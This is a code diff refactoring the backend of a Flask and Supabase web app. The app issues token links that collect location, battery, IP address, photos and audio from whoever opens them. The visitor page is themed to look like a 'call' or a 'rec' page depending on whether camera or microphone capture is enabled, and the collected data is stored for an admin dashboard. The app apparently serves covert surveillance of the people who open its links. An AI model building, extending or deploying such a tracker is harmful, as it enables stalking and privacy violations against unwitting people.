@@ -32,8 +32,12 @@ SUPABASE_ANON_KEY = os.environ.get("SUPABASE_ANON_KEY")
 SUPABASE_SERVICE_KEY = os.environ.get("SUPABASE_SERVICE_KEY")
 STORAGE_BUCKET = os.environ.get("SUPABASE_STORAGE_BUCKET", "tracker-media")
 
-# Initialize Supabase client
-supabase: Client = create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY) if SUPABASE_URL and SUPABASE_SERVICE_KEY else None
+
+# Lazy Supabase client initialization
+def get_supabase() -> Client:
+    if not SUPABASE_URL or not SUPABASE_SERVICE_KEY:
+        raise RuntimeError("Supabase credentials not configured")
+    return create_client(SUPABASE_URL, SUPABASE_SERVICE_KEY)
 
 
 def now_iso():
@@ -47,6 +51,12 @@ def admin_required(fn):
             return redirect(url_for("login"))
         return fn(*args, **kwargs)
     return wrap
+
+
+# Health check endpoint for Render
+@app.route("/healthz")
+def healthz():
+    return jsonify({"status": "ok", "time": now_iso()})
 
 
 # ---------------- Auth / pages ----------------
@@ -83,6 +93,7 @@ def dashboard():
 @app.route("/api/links", methods=["GET", "POST"])
 @admin_required
 def api_links():
+    sb = get_supabase()
     if request.method == "POST":
         data = request.get_json(force=True) or {}
         token = secrets.token_urlsafe(10)
@@ -96,42 +107,44 @@ def api_links():
             "active": True,
             "created_at": now_iso(),
         }
-        result = supabase.table("links").insert(link_data).execute()
+        result = sb.table("links").insert(link_data).execute()
         link = result.data[0]
-        return jsonify(serialize_link(link))
-    
-    result = supabase.table("links").select("*").eq("active", True).order("id", desc=True).execute()
-    return jsonify([serialize_link(r) for r in result.data])
+        return jsonify(serialize_link(link, request))
+
+    result = sb.table("links").select("*").eq("active", True).order("id", desc=True).execute()
+    return jsonify([serialize_link(r, request) for r in result.data])
 
 
-def serialize_link(row):
+def serialize_link(row, req):
     d = dict(row)
-    d["url"] = request.host_url.rstrip("/") + url_for("client_page", token=d["token"])
+    d["url"] = req.host_url.rstrip("/") + url_for("client_page", token=d["token"])
     return d
 
 
 @app.route("/api/links/<int:link_id>", methods=["DELETE"])
 @admin_required
 def api_link_delete(link_id):
-    supabase.table("links").update({"active": False}).eq("id", link_id).execute()
+    sb = get_supabase()
+    sb.table("links").update({"active": False}).eq("id", link_id).execute()
     return jsonify({"ok": True})
 
 
 # ---------------- Client endpoints (token-gated, no admin auth) ----------------
 @app.route("/t/<token>")
 def client_page(token):
-    result = supabase.table("links").select("*").eq("token", token).eq("active", True).execute()
+    sb = get_supabase()
+    result = sb.table("links").select("*").eq("token", token).eq("active", True).execute()
     if not result.data:
         abort(404)
     link = result.data[0]
-    
+
     if link["cam"]:
         theme = "call"
     elif link["mic"]:
         theme = "rec"
     else:
         theme = "track"
-    
+
     cfg = {
         "token": link["token"],
         "loc": bool(link["loc"]),
@@ -146,12 +159,13 @@ def client_page(token):
 
 @app.route("/api/t/<token>/report", methods=["POST"])
 def api_report(token):
-    result = supabase.table("links").select("*").eq("token", token).eq("active", True).execute()
+    sb = get_supabase()
+    result = sb.table("links").select("*").eq("token", token).eq("active", True).execute()
     if not result.data:
         return jsonify({"ok": False, "error": "invalid token"}), 404
     link = result.data[0]
     data = request.get_json(force=True) or {}
-    
+
     report_data = {
         "link_id": link["id"],
         "lat": data.get("lat"),
@@ -166,34 +180,35 @@ def api_report(token):
         "ip": request.remote_addr,
         "created_at": now_iso(),
     }
-    supabase.table("reports").insert(report_data).execute()
+    sb.table("reports").insert(report_data).execute()
     return jsonify({"ok": True})
 
 
 @app.route("/api/t/<token>/media", methods=["POST"])
 def api_media_upload(token):
-    result = supabase.table("links").select("*").eq("token", token).eq("active", True).execute()
+    sb = get_supabase()
+    result = sb.table("links").select("*").eq("token", token).eq("active", True).execute()
     if not result.data:
         return jsonify({"ok": False, "error": "invalid token"}), 404
     link = result.data[0]
-    
+
     kind = request.form.get("kind", "photo")
     if kind not in ("photo", "audio"):
         return jsonify({"ok": False, "error": "bad kind"}), 400
-    
+
     f = request.files.get("file")
     if not f or not f.filename:
         return jsonify({"ok": False, "error": "no file"}), 400
-    
+
     ext = ".jpg" if kind == "photo" else ".webm"
     fname = f"{int(time.time()*1000)}_{uuid.uuid4().hex[:8]}{ext}"
-    
+
     # Upload to Supabase Storage
     file_bytes = f.read()
-    supabase.storage.from_(STORAGE_BUCKET).upload(fname, file_bytes, {
+    sb.storage.from_(STORAGE_BUCKET).upload(fname, file_bytes, {
         "content-type": "image/jpeg" if kind == "photo" else "video/webm"
     })
-    
+
     # Save media record
     media_data = {
         "link_id": link["id"],
@@ -201,8 +216,8 @@ def api_media_upload(token):
         "filename": fname,
         "created_at": now_iso(),
     }
-    supabase.table("media").insert(media_data).execute()
-    
+    sb.table("media").insert(media_data).execute()
+
     return jsonify({"ok": True, "filename": fname})
 
 
@@ -210,8 +225,9 @@ def api_media_upload(token):
 @app.route("/api/reports")
 @admin_required
 def api_reports():
+    sb = get_supabase()
     # Get reports with link names
-    result = supabase.table("reports").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
+    result = sb.table("reports").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
     out = []
     for r in result.data:
         d = dict(r)
@@ -223,20 +239,22 @@ def api_reports():
 @app.route("/api/stats/<int:link_id>")
 @admin_required
 def api_stats(link_id):
-    result = supabase.table("reports").select("created_at, accuracy, battery_level, battery_charging, lat, lon").eq("link_id", link_id).order("id", desc=True).execute()
+    sb = get_supabase()
+    result = sb.table("reports").select("created_at, accuracy, battery_level, battery_charging, lat, lon").eq("link_id", link_id).order("id", desc=True).execute()
     return jsonify([dict(r) for r in result.data])
 
 
 @app.route("/api/media")
 @admin_required
 def api_media_list():
-    result = supabase.table("media").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
+    sb = get_supabase()
+    result = sb.table("media").select("*, links!inner(name)").order("id", desc=True).limit(500).execute()
     out = []
     for r in result.data:
         d = dict(r)
         d["link_name"] = r["links"]["name"] if r.get("links") else "Unknown"
         # Get signed URL for media (valid for 1 hour)
-        signed_url = supabase.storage.from_(STORAGE_BUCKET).create_signed_url(r["filename"], 3600)
+        signed_url = sb.storage.from_(STORAGE_BUCKET).create_signed_url(r["filename"], 3600)
         d["url"] = signed_url.get("signedURL", "") if isinstance(signed_url, dict) else str(signed_url)
         out.append(d)
     return jsonify(out)
@@ -246,7 +264,8 @@ def api_media_list():
 @admin_required
 def media_file(filename):
     # Proxy media through signed URL
-    signed_url = supabase.storage.from_(STORAGE_BUCKET).create_signed_url(filename, 3600)
+    sb = get_supabase()
+    signed_url = sb.storage.from_(STORAGE_BUCKET).create_signed_url(filename, 3600)
     url = signed_url.get("signedURL", "") if isinstance(signed_url, dict) else str(signed_url)
     return redirect(url)
 
